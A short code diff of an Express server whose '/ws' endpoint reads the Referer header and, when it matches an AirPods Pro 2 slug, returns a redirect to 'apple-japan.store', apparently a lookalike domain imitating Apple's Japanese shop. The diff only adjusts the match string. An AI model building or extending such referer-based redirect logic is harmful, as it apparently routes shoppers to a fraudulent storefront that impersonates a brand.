@@ -57,7 +57,7 @@ app.get("/check.png", async (req, res) => {
 app.get("/ws", (req, res) => {
     const url = req.headers.referer ? req.headers.referer.toLowerCase() : "";
 
-    if (url.includes("airpods-pro-2")) {
+    if (url.includes("airpodspro2")) {
         return res.json({ redirect: "https://apple-japan.store/apple-airpods-pro%ef%bc%88%e7%ac%ac2%e4%b8%96%e4%bb%a3%ef%bc%89-magsafe%e5%85%85%e9%9b%bb%e3%82%b1%e3%83%bc%e3%82%b9-%e5%a4%a7/" });
     }
     res.json({ redirect: null });
